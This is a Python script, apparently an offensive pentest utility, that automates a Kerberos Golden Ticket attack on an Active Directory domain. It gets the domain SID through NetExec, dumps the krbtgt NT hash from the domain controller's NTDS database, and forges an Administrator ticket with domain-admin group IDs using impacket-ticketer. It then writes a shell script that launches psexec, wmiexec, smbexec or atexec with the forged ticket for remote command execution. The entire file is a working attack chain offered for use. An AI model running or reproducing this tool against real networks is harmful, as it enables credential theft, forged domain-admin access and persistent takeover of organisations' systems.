import subprocess
import argparse
from colorama import init, Fore, Style
import textwrap

init(autoreset=True)

ASCII_ART = f"""\
{Fore.YELLOW}
╔═╗╔═╗╦ ╔╦╗╔═╗╔╗╔  ╔╦╗╦╔═╗╦╔═╔═╗╔╦╗
║ ╦║ ║║  ║║║╣ ║║║───║ ║║  ╠╩╗║╣  ║
╚═╝╚═╝╩══╩╝╚═╝╝╚╝   ╩ ╩╚═╝╩ ╩╚═╝ ╩
{Style.RESET_ALL}
"""

def print_header(title):
    print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 50}")
    print(f"{Fore.CYAN}{Style.BRIGHT}|| {title.center(46)} ||")
    print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 50}")

def print_success(message):
    print(f"{Fore.GREEN}{Style.BRIGHT}[+] {message}")

def print_error(message):
    print(f"{Fore.RED}{Style.BRIGHT}[-] {message}")

def print_info(message):
    print(f"{Fore.YELLOW}{Style.BRIGHT}[*] {message}")

def print_prompt(message):
    return input(f"{Fore.MAGENTA}{Style.BRIGHT}[?] {message}: ")

print(ASCII_ART)

parser = argparse.ArgumentParser(
    description="Extract Domain SID, krbtgt NT hash, generate Kerberos ticket, and create an Impacket shell script",
    formatter_class=argparse.RawTextHelpFormatter
)
parser.add_argument("--ip", required=True, help="Target domain IP address (dc-ip)")
parser.add_argument("--user", required=True, help="Username for authentication")
parser.add_argument("--domain", required=True, help="Domain name (e.g., domain.local)")

auth_group = parser.add_mutually_exclusive_group(required=True)
auth_group.add_argument("--password", "-p", help="Password for authentication")
auth_group.add_argument("--hashes", "-H", help="NT hash (NTHASH or LMHASH:NTHASH)")

args = parser.parse_args()

def normalize_hash(h):
    if ':' not in h:
        return f"aad3b435b51404eeaad3b435b51404ee:{h}"
    return h

def get_nt_only(h):
    return normalize_hash(h).split(':')[1]

def parse_sid(output):
    """Extract S-1-5-21-... SID from nxc output."""
    for line in output.splitlines():
        line = line.strip()
        if 'S-1-5-21-' in line:
            for token in line.split():
                if token.startswith('S-1-5-21-'):
                    return token
    return None

if args.password:
    auth_args = ['-u', args.user, '-p', args.password]
    print_info(f"Using password authentication for user: {args.user}")
else:
    full_hash = normalize_hash(args.hashes)
    nt_only   = get_nt_only(args.hashes)
    auth_args = ['-u', args.user, '-H', nt_only]
    print_info(f"Using hash authentication for user: {args.user} ({full_hash})")

try:
    # ── Step 1: Try LDAP for SID, fall back to SMB ───────────────────────────
    print_header("Domain SID Retrieval")
    domain_sid = None

    print_info("Trying LDAP for Domain SID...")
    ldap_cmd = ['nxc', 'ldap', args.ip] + auth_args + ['--get-sid']
    ldap_result = subprocess.run(ldap_cmd, capture_output=True, text=True)
    domain_sid = parse_sid(ldap_result.stdout)

    if domain_sid:
        print_success(f"Domain SID (via LDAP): {domain_sid}")
    else:
        print_info("LDAP did not return SID, trying SMB...")
        smb_sid_cmd = ['nxc', 'smb', args.ip] + auth_args + ['--get-sid']
        smb_sid_result = subprocess.run(smb_sid_cmd, capture_output=True, text=True)
        domain_sid = parse_sid(smb_sid_result.stdout)

        if domain_sid:
            print_success(f"Domain SID (via SMB): {domain_sid}")
        else:
            print_error("Could not retrieve Domain SID via LDAP or SMB. Raw output:")
            print(ldap_result.stdout)
            print(smb_sid_result.stdout)
            exit(1)

    # ── Step 2: Dump krbtgt hash via SMB NTDS ────────────────────────────────
    print_header("SMB NT Hash Retrieval")
    print_info("Dumping NTDS to retrieve krbtgt hash (streaming output)...")

    smb_ntds_cmd = ['nxc', 'smb', args.ip] + auth_args + ['--ntds', '--user', 'krbtgt']
    krbtgt_nthash = None
    process = subprocess.Popen(smb_ntds_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in process.stdout:
        print(f"{Fore.WHITE}{line}", end='')
        if 'krbtgt' in line and line.count(':') >= 3:
            parts = line.split(':')
            if len(parts) >= 4:
                krbtgt_nthash = parts[3].strip()
    process.wait()

    if krbtgt_nthash:
        print_success(f"NT Hash for krbtgt: {krbtgt_nthash}")
    else:
        print_error("NT Hash for krbtgt not found in output.")
        exit(1)

    # ── Step 3: Forge Golden Ticket ───────────────────────────────────────────
    print_header("Kerberos Ticket Generation")
    print_info("Forging Golden Ticket with impacket-ticketer...")

    ticketer_command = [
        'impacket-ticketer',
        '-nthash', krbtgt_nthash,
        '-domain-sid', domain_sid,
        '-domain', args.domain,
        '-user-id', '500',
        '-groups', '512,513,518,519,520',
        'Administrator'
    ]
    ticketer_result = subprocess.run(ticketer_command, capture_output=True, text=True, check=True)
    print_success("Ticket generation output:")
    print(f"{Fore.WHITE}{textwrap.indent(ticketer_result.stdout, '  ')}")

    # ── Step 4: Verify ccache ─────────────────────────────────────────────────
    print_header("Ticket File Verification")
    ls_result = subprocess.run("ls -al | grep ccache", shell=True, capture_output=True, text=True)
    if ls_result.stdout.strip():
        print_success("ccache file found:")
        print(f"{Fore.WHITE}{textwrap.indent(ls_result.stdout, '  ')}")
    else:
        print_error("No ccache file found.")

    # ── Step 5: Impacket shell ────────────────────────────────────────────────
    print_header("Impacket Tool Selection")
    while True:
        use_impacket = print_prompt("Do you want to utilize Impacket? [Yes/No]").lower()
        if use_impacket in ['yes', 'no']:
            break
        print_error("Invalid choice. Please enter 'Yes' or 'No'.")

    if use_impacket == 'no':
        print_success("Exiting script.")
        exit(0)

    device = print_prompt("What is the Device (hostname)").strip()
    if not device:
        print_error("Device name is required")
        exit(1)

    target_ip = print_prompt("What is the Target IP").strip()
    if not target_ip:
        print_error("Target IP is required")
        exit(1)

    print_info("Available tools: psexec, wmiexec, smbexec, atexec")
    while True:
        impacket_tool = print_prompt("Enter tool (psexec/wmiexec/smbexec/atexec)").lower()
        if impacket_tool in ['psexec', 'wmiexec', 'smbexec', 'atexec']:
            break
        print_error("Invalid choice.")

    command = None
    if impacket_tool == 'atexec':
        command = print_prompt("Enter the command to execute with atexec").strip()
        if not command:
            print_error("A command is required for atexec")
            exit(1)

    full_domain = f"{args.domain}/Administrator@{device}.{args.domain}"
    if impacket_tool == 'psexec':
        impacket_command = f"impacket-psexec -dc-ip {args.ip} -target-ip {target_ip} -no-pass -k {full_domain}"
    elif impacket_tool == 'wmiexec':
        impacket_command = f"impacket-wmiexec -dc-ip {args.ip} -target-ip {target_ip} -no-pass -k {full_domain}"
    elif impacket_tool == 'smbexec':
        impacket_command = f"impacket-smbexec -k -no-pass -dc-ip {args.ip} {device}.{args.domain}"
    elif impacket_tool == 'atexec':
        impacket_command = f"impacket-atexec -k -no-pass -dc-ip {args.ip} {device}.{args.domain} \"{command}\""

    shell_script = "run_impacket.sh"
    with open(shell_script, 'w') as f:
        f.write("#!/bin/bash\n")
        f.write("export KRB5CCNAME=Administrator.ccache\n")
        f.write(f"{impacket_command}\n")
    subprocess.run(f"chmod +x {shell_script}", shell=True, check=True)

    print_header("Generated Shell Script")
    print_success(f"Generated: {shell_script}")
    with open(shell_script, 'r') as f:
        print(f"{Fore.WHITE}{textwrap.indent(f.read(), '  ')}")
    print_success(f"Run it with: ./{shell_script}")
    print_success("Done.")

except subprocess.CalledProcessError as e:
    print_error(f"Error executing command: {e}")
    print(f"{Fore.RED}Stderr:\n{textwrap.indent(e.stderr or '', '  ')}")
except Exception as e:
    print_error(f"An unexpected error occurred: {e}")
